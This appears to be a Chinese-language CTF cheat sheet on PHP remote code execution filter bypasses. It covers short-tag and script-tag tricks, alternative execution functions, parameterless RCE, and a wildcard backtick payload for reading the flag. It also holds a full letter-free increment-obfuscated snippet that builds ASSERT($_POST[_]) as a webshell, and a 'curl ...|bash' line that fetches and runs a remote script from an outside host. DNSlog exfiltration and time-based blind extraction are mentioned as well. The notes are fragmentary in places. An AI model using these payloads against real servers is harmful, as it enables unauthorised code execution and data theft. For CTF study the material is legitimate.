## 参数名字中带有非法字符
如果我们的输入参数中存在非法字符 `_`,那么我们就需要通过把我们的原文中的 `_` 改写为 `[,.` 进行一次转换后，才能得到最终的参数。

## Escapeshellarg 和 Escapteshellcmd

### Php 头过滤
1. 采用 `script` 方法绕过：`<script language="php"> phpinfo()<script>`
2. 采用短标签方法绕过：`<?='Hello World'?>`,

关键字过滤
### 过滤函数关键字：
方法一：换用心的函数：
1. System
使用我们的 system 函数执行的时候，会有一定的回显

2. Exec
使用我们的 exec 的函数执行的时候，没有任何的回显

3. 反引号
使用我们的反引号执行的时候，只存在一个是否执行的回显

4. Passthru

5. Proc_open

6. Popen

7. Pcntl_exec


## 过滤我们的参数：
**注意，我们再进行 RCE 的时候，记得要给我们的语句打上分号**
我们可以采用我们的无参数 RCE 相关的函数，来实现我们的无参数相关构造。
```
print_r(end(pos(get_defined_vars())));
```

## System 命令执行函数：
方法一：通过我们的反引号绕过：
```
?code=var_dump(`nl%20/f????????????????`)
```


方法二：通过我们的类似指令来执行：
```
passthru() exec() shell_exec() popen() proc_open() pcntl_exec(),system()
```

方法三：
```
eval()相关执行：
1. 直接输入想要执行的语句
2. $_GET[_function_](_arg_),在我们的长度不足的时候，我们可以考虑使用这个方法，其中如果我们的【】被过滤，我们可以改用{}。${_GET}{_function_}(_arg_)
```


##  关键字过滤

### Level 2（无参数 RCE）


### level 3（无字母，数字 RCE）
方法六：自增绕过：
```cpp
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E 
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;
 
$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;
 
$_=$$____;
$___($_[_]); // ASSERT ($_POST[_]);
```


## 无回显
1. 利用管道符 `>` 输出到 `1.txt`
2. 利用请求带出，把我们当前的结果作为一个参数带出到我们的外部服务器当中，再去通过我们的外部服务器相关回显来进行最终的计算。
```
--http发送请求
curl http://d.y1ng.vip:12390/dev.txt|bash
--dnslog带出（不能发出http请求）

--wget命令注入
```

3. 时间忙注
```
截取函数：
1. cut -c
2. ${}
判断函数：
sleep()
```

